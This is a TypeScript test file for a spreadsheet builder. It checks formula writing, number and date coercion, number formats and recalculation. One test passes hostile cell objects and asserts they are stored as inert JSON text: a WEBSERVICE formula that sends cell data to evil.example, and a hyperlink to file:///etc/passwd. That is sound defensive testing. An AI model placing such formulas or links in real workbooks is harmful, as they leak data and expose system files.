import { describe, it, expect } from "vitest";
import * as fs from "fs/promises";
import * as os from "os";
import * as path from "path";
import ExcelJS from "exceljs";
import JSZip from "jszip";
import type { Workspace } from "../../../../shared/types";
import { SpreadsheetBuilder } from "../spreadsheet";

describe("SpreadsheetBuilder", () => {
  it('writes formula strings (e.g. "=SUM(A1:A2)") as Excel formulas', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const workspace: Workspace = {
      id: "test-workspace",
      name: "test-workspace",
      path: tmpDir,
      createdAt: Date.now(),
      permissions: { read: true, write: true, delete: true, network: true, shell: false },
    };

    const builder = new SpreadsheetBuilder(workspace);
    const outPath = path.join(tmpDir, "formulas.xlsx");

    await builder.create(outPath, [
      {
        name: "Data",
        hasHeader: false,
        data: [
          ["A", "B", "Sum"],
          ["1", "2", "=A2+B2"],
          ["Total", "", "=SUM(C2:C2)"],
        ],
      },
    ]);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Data");
    expect(ws).toBeTruthy();

    const c2 = ws!.getCell("C2").value;
    expect(c2).toBeTruthy();
    expect(typeof c2).toBe("object");
    expect(c2).toMatchObject({ formula: "A2+B2" });
  });

  it("stores numeric text as numbers so formulas over it compute", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const workspace: Workspace = {
      id: "test-workspace",
      name: "test-workspace",
      path: tmpDir,
      createdAt: Date.now(),
      permissions: { read: true, write: true, delete: true, network: true, shell: false },
    };
    const outPath = path.join(tmpDir, "revenue.xlsx");

    await new SpreadsheetBuilder(workspace).create(outPath, [
      {
        name: "Revenue",
        data: [
          ["Region", "Revenue", "2024"],
          ["EMEA", "1200", "1,234.50"],
          ["APAC", "800", "-0.75"],
          ["Total", "=SUM(B2:B3)", ""],
        ],
      },
    ]);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Revenue")!;
    expect(ws.getCell("B2").value).toBe(1200);
    expect(ws.getCell("B3").value).toBe(800);
    expect(ws.getCell("C2").value).toBe(1234.5);
    expect(ws.getCell("C3").value).toBe(-0.75);
    expect(ws.getCell("B4").value).toMatchObject({ formula: "SUM(B2:B3)" });
    // Header labels stay text even when they look numeric.
    expect(ws.getCell("C1").value).toBe("2024");
  });

  it("keeps identifiers and codes that look numeric as text", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const workspace: Workspace = {
      id: "test-workspace",
      name: "test-workspace",
      path: tmpDir,
      createdAt: Date.now(),
      permissions: { read: true, write: true, delete: true, network: true, shell: false },
    };
    const outPath = path.join(tmpDir, "codes.xlsx");
    const codes = [
      "02134",
      "+15551234567",
      "555-123-4567",
      "1.2.3",
      "AB-123",
      "12345678901234567890",
      "12%",
    ];

    await new SpreadsheetBuilder(workspace).create(outPath, [
      { name: "Codes", data: [["Code"], ...codes.map((code) => [code])] },
    ]);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Codes")!;
    codes.forEach((code, index) => {
      expect(ws.getCell(`A${index + 2}`).value).toBe(code);
    });
  });

  it("writes object and array cells as JSON text, not as ExcelJS formulas or links", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const workspace: Workspace = {
      id: "test-workspace",
      name: "test-workspace",
      path: tmpDir,
      createdAt: Date.now(),
      permissions: { read: true, write: true, delete: true, network: true, shell: false },
    };
    const outPath = path.join(tmpDir, "objects.xlsx");
    // Shapes ExcelJS would otherwise write as a formula, hyperlink, rich text or error cell.
    const objectCells = [
      { formula: 'WEBSERVICE("https://evil.example/?"&A1)' },
      { text: "Invoice", hyperlink: "file:///etc/passwd" },
      { richText: [{ text: "rich" }] },
      { error: "#N/A" },
      ["nested", 1],
    ];

    await new SpreadsheetBuilder(workspace).create(outPath, [
      { name: "Cells", data: [[{ formula: "1+1" }], ...objectCells.map((cell) => [cell])] },
    ]);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Cells")!;
    expect(ws.getCell("A1").value).toBe('{"formula":"1+1"}');
    objectCells.forEach((cell, index) => {
      expect(ws.getCell(`A${index + 2}`).value).toBe(JSON.stringify(cell));
    });
  });

  it("saves formula results and asks Excel to recalculate on open", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const outPath = path.join(tmpDir, "budget.xlsx");

    const report = await new SpreadsheetBuilder(createWorkspace(tmpDir)).create(outPath, [
      {
        name: "Transactions",
        data: [
          ["Category", "Amount EUR"],
          ["Venue", "180"],
          ["Catering", "96.5"],
          ["Venue", "-30"],
        ],
      },
      {
        name: "Summary",
        data: [
          ["Category", "Total EUR"],
          ["Venue", "=SUMIF(Transactions!A2:A4,A2,Transactions!B2:B4)"],
          ["Total", "=SUM(Transactions!B2:B4)"],
          ["Lookup", '=XLOOKUP("Venue",A2:A3,B2:B3)'],
        ],
      },
    ]);

    expect(report.formulas.computed).toBe(2);
    expect(report.formulas.uncached).toEqual([
      {
        sheet: "Summary",
        address: "B4",
        formula: 'XLOOKUP("Venue",A2:A3,B2:B3)',
        reason: "XLOOKUP is not evaluated by CoWork",
      },
    ]);
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const summary = wb.getWorksheet("Summary")!;
    expect(summary.getCell("B2").value).toEqual({
      formula: "SUMIF(Transactions!A2:A4,A2,Transactions!B2:B4)",
      result: 150,
    });
    expect(summary.getCell("B3").value).toEqual({
      formula: "SUM(Transactions!B2:B4)",
      result: 246.5,
    });
    expect(summary.getCell("B4").value).toEqual({ formula: 'XLOOKUP("Venue",A2:A3,B2:B3)' });
    const workbookXml = await (
      await JSZip.loadAsync(await fs.readFile(outPath))
    )
      .file("xl/workbook.xml")!
      .async("string");
    expect(workbookXml).toMatch(/<calcPr[^>]*fullCalcOnLoad="1"/);
  });

  it("applies number formats by header, column letter and range, skipping the header row", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const outPath = path.join(tmpDir, "formats.xlsx");
    const euro = "€#,##0.00;[Red]-€#,##0.00";

    const report = await new SpreadsheetBuilder(createWorkspace(tmpDir)).create(outPath, [
      {
        name: "Data",
        data: [
          ["Item", "Amount EUR", "Share", "Total"],
          ["Room", "180", "0.5", "=B2"],
          ["Snacks", "96.5", "0.25", "=B3"],
        ],
        numberFormats: [
          { column: "amount eur", numFmt: euro },
          { column: "C", numFmt: "0.0%" },
          { range: "D2:D3", numFmt: "#,##0" },
          { column: "Missing", numFmt: "0.00" },
          { column: "B", numFmt: "" },
          { range: "not-a-range", numFmt: "0.00" },
        ],
      },
    ]);

    expect(report.warnings).toEqual([
      'Sheet "Data": column "Missing" was not found, so "0.00" was not applied.',
      'Sheet "Data": skipped invalid number format "".',
      'Sheet "Data": range "not-a-range" is not a usable A1 range, so "0.00" was not applied.',
    ]);
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Data")!;
    expect(ws.getCell("B1").numFmt).toBeUndefined();
    expect([ws.getCell("B2").numFmt, ws.getCell("B3").numFmt]).toEqual([euro, euro]);
    expect(ws.getCell("C2").numFmt).toBe("0.0%");
    expect(ws.getCell("D3").numFmt).toBe("#,##0");
    expect(ws.getCell("B2").value).toBe(180);
  });

  it("stores ISO date text as real Excel dates and keeps ids as text", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const outPath = path.join(tmpDir, "Northstar-pilot-costs.xlsx");

    // The create_spreadsheet input from the live round-3 expense workbook.
    const report = await new SpreadsheetBuilder(createWorkspace(tmpDir)).create(outPath, [
      {
        name: "Expenses",
        data: [
          ["Invoice ID", "Date", "Supplier", "Net EUR", "VAT rate", "VAT EUR", "Gross EUR"],
          ["00041", "2026-10-05", "Audio kit rental", 120, 0.23, "=D2*E2", "=D2+F2"],
          ["00042", "2026-10-07", "Printed welcome cards", 45.5, 0.23, "=D3*E3", "=D3+F3"],
          ["CR-0041", "2026-10-08", "Audio kit rental credit", -20, 0.23, "=D4*E4", "=D4+F4"],
          ["00043", "2026-10-09", "Caption editing", 80, 0, "=D5*E5", "=D5+F5"],
        ],
      },
      {
        name: "Summary",
        data: [
          ["Metric", "EUR"],
          ["Net total", "=SUM(Expenses!D2:D5)"],
          ["Days covered", "=Expenses!B5-Expenses!B2"],
        ],
      },
    ]);

    expect(report.formulas).toEqual({ computed: 10, uncached: [] });
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Expenses")!;
    expect(ws.getCell("B2").value).toEqual(new Date(Date.UTC(2026, 9, 5)));
    expect(ws.getCell("B5").value).toEqual(new Date(Date.UTC(2026, 9, 9)));
    expect(ws.getCell("B2").numFmt).toBe("yyyy-mm-dd");
    expect(ws.getCell("B1").value).toBe("Date");
    expect(["A2", "A3", "A4", "A5"].map((address) => ws.getCell(address).value)).toEqual([
      "00041",
      "00042",
      "CR-0041",
      "00043",
    ]);
    // Dates are numbers to formulas.
    expect(wb.getWorksheet("Summary")!.getCell("B3").result).toBe(4);
    // A date column is sized for the date, not for Date#toString().
    expect(ws.getColumn(2).width).toBeLessThan(15);
  });

  it("reads date text in the order of a requested date format and respects text formats", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
    const outPath = path.join(tmpDir, "dates.xlsx");

    await new SpreadsheetBuilder(createWorkspace(tmpDir)).create(outPath, [
      {
        name: "Dates",
        data: [
          ["Due", "Booked", "Code", "Logged", "Amount"],
          ["05/10/2026", "2026-10-05", "2026-10-05", "2026-10-05T09:30", "2026-10-05"],
          ["31/04/2026", "2026-02-30", "00041", "2026-10-05 09:30:15", "12"],
        ],
        numberFormats: [
          { column: "Due", numFmt: "DD/MM/YYYY" },
          { column: "Booked", numFmt: "dd/mm/yyyy" },
          { column: "Code", numFmt: "@" },
          { column: "Amount", numFmt: "€#,##0.00" },
        ],
      },
    ]);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.readFile(outPath);
    const ws = wb.getWorksheet("Dates")!;
    // 05/10/2026 under DD/MM/YYYY is 5 October; 31/04 does not exist and stays text.
    expect(ws.getCell("A2").value).toEqual(new Date(Date.UTC(2026, 9, 5)));
    expect(ws.getCell("A2").numFmt).toBe("DD/MM/YYYY");
    expect(ws.getCell("A3").value).toBe("31/04/2026");
    // The requested format is kept; an impossible ISO date stays text.
    expect(ws.getCell("B2").value).toEqual(new Date(Date.UTC(2026, 9, 5)));
    expect(ws.getCell("B2").numFmt).toBe("dd/mm/yyyy");
    expect(ws.getCell("B3").value).toBe("2026-02-30");
    // "@" keeps text as text.
    expect(ws.getCell("C2").value).toBe("2026-10-05");
    expect(ws.getCell("C3").value).toBe("00041");
    // A time of day keeps its precision in the default format.
    expect(ws.getCell("D2").value).toEqual(new Date(Date.UTC(2026, 9, 5, 9, 30)));
    expect(ws.getCell("D2").numFmt).toBe("yyyy-mm-dd hh:mm");
    expect(ws.getCell("D3").numFmt).toBe("yyyy-mm-dd hh:mm:ss");
    // A currency column is not reinterpreted as dates.
    expect(ws.getCell("E2").value).toBe("2026-10-05");
    expect(ws.getCell("E3").value).toBe(12);
  });
});

function createWorkspace(tmpDir: string): Workspace {
  return {
    id: "test-workspace",
    name: "test-workspace",
    path: tmpDir,
    createdAt: Date.now(),
    permissions: { read: true, write: true, delete: true, network: true, shell: false },
  };
}
